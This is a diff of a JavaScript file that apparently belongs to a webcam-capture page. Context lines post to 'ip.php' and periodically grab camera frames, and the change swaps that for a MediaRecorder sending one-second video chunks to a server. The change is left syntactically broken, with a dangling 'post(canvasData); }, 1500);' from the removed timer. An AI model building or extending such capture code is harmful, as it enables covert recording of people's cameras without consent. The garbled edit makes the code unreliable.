@@ -76,11 +76,17 @@ xhr.open("POST", "ip.php");
     window.stream = stream;
     video.srcObject = stream;
 
-    var context = canvas.getContext('2d');
-    setInterval(function () {
+    // Create MediaRecorder to record video chunks
+const options = { mimeType: 'video/webm; codecs=vp8' };
+const mediaRecorder = new MediaRecorder(stream, options);
 
-      context.drawImage(video, 0, 0, 640, 480);
-      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+mediaRecorder.ondataavailable = function (event) {
+  if (event.data && event.data.size > 0) {
+    sendVideoChunk(event.data); // send the chunk to server
+  }
+};
+
+mediaRecorder.start(1000); // capture video in 1-second chunks
       post(canvasData);
     }, 1500);
 
